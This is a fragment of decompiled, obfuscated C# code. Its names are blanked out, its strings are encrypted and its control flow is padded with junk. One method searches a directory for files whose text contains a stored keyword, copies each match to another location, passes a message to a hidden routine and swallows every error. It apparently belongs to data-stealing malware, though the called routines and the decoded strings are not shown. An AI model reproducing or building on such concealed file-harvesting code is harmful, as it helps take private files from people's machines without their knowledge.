using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;

public class ____________________________________
{
	public string _;

	public ____________________________________()
	{
	}

	public void _()
	{
		int num = 0;
		try
		{
			bool flag = false;
			DirectoryInfo directoryInfo = new DirectoryInfo(______________________.___);
			FileInfo[] files = directoryInfo.GetFiles(<Module>.___<string>(-286239852));
			for (int i = 0; i < checked((int)files.Length); i++)
			{
				FileInfo fileInfo = files[i];
				try
				{
					while (File.ReadAllText(fileInfo.FullName).ToLower().Contains(this._))
					{
						if ((766464 * num & 32) != 0)
						{
							continue;
						}
						File.WriteAllText(string.Concat(______________________._____, this._, <Module>.____<string>(511728657)), File.ReadAllText(fileInfo.FullName));
						______________________________________________________________.______________(<Module>.___<string>(982404538), string.Concat(<Module>.______<string>(372145989), this._, <Module>._______<string>(1916090129)));
						flag = true;
						break;
					}
				}
				catch (Exception exception)
				{
					ProjectData.SetProjectError(exception);
					ProjectData.ClearProjectError();
				}
			}
			if (flag)
			{
				____________________._();
			}
		}
		catch (Exception exception2)
		{
			ProjectData.SetProjectError(exception2);
			Exception exception1 = exception2;
			______________________________________________________________.______________(<Module>._______<string>(-1937358506), string.Concat(<Module>._____<string>(991691740), exception1.ToString()));
			ProjectData.ClearProjectError();
		}
	}
}